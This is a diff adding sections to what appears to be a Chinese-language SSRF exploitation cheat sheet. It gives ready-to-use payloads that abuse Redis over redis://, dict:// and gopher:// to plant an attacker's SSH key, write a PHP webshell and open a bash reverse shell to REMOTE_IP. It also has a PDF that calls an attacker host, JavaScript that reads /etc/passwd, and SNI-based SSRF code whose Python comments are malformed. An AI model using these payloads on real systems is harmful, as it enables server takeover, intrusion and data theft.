@@ -171,3 +171,108 @@ gopher://WSGI服务器地址:8000/_%00%1A%00%00%0A%00WSGI_FILE%0C%00/tmp/test.py
 | key data              | (m bytes) |    | UWSGI_FILE |   |
 | value length          | (2 bytes) | 12 | (%0C%00)   |   |
 | value data            | (n bytes) |    | /tmp/test.py   |   |
+
+
+(2)Redis
+
+SSH覆盖执行系统命令
+```html
+/proxy?url=redis://Redis服务器地址:6379/config%20set%20dir%20/var/lib/redis/.ssh/
+# 将Redis保存数据的目录更改为Redeis进程运行时的用户目录.ssh
+/proxy?url=redis:// Redis服务器地址:6379/config%20set%20dbfilename%20authorized_keys
+# 将数据库文件名更改为authorized_keys，这是SSH服务器再确定SSH访问的授权公钥时查找的文件
+/proxy?url=redis:// Redis服务器地址:6379/set%20mykey%20%22ssh-rsa%20AAAAB3Nza...user@attacker.com%22
+# 将mykey密钥的值设置为攻击者的公共SSH密钥
+/proxy?url=redis://Redis服务器地址:6379/save
+# 指示Redis保存数据，这回将攻击者的公钥写入.ssh/authorized_keys文件，接下来便可以通过SSH连接Redis的服务器并执行系统命令
+```
+
+获取一个webshell
+```html
+url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
+url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
+url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
+url=dict://127.0.0.1:6379/SAVE
+```
+
+获取一个PHP回连的webshell
+```html
+url=gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
+url=gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
+url=gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
+url=gopher://127.0.0.1:6379/_save
+```
+
+(3)PDF
+
+源文件
+```pdf
+%PDF-1.5
+1 0 obj
+<<
+  /Type /XObject
+  /Subtype /Image
+  /Width 500
+  /Height 500
+  /Filter /DCTDecode
+  /ColorSpace /DeviceRGB
+  /Length 12345
+  /F (http://攻击者主机地址/)
+>>
+stream
+...二进制PDF文件数据...
+endstream
+endobj
+```
+
+```html
+<link rel=attachment href="file:///root/secret.txt">
+```
+
+```html
+<script>
+    exfil = new XMLHttpRequest();
+    exfil.open("GET","file:///etc/passwd");
+    exfil.send();
+    exfil.onload = function(){document.write(this.responseText);}
+    exfil.onerror = function(){document.write('failed!')}
+</script>
+```
+
+(4)SNI
+
+SNI利用OpenSSL
+```python
+from OpenSSL import SSL
+import socket
+
+//建立TCP连接
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(('外部允许的服务器地址', 443))
+
+//创建SSL上下文
+ctx = SSL.Context(SSL.SSLv23_METHOD)  //使用适当方法
+ssl_sock = SSL.Connection(ctx, sock)
+
+//设置SNI为内部目标地址
+ssl_sock.set_tlsext_host_name(b'内部目标地址')
+
+执行TLS握手
+ssl_sock.do_handshake()
+
+//通过SSL连接发送HTTP请求
+ssl_sock.sendall(b"GET / HTTP/1.1\r\nHost: 外部允许的服务器地址\r\n\r\n")
+
+//读取响应
+response = ssl_sock.recv(4096)
+print(response)
+
+//取消连接
+ssl_sock.shutdown()
+ssl_sock.close()
+```
+
+命令
+```bash
+openssl s_client -connect 目标地址:443 -servername "内部目标地址" -crlf
+```
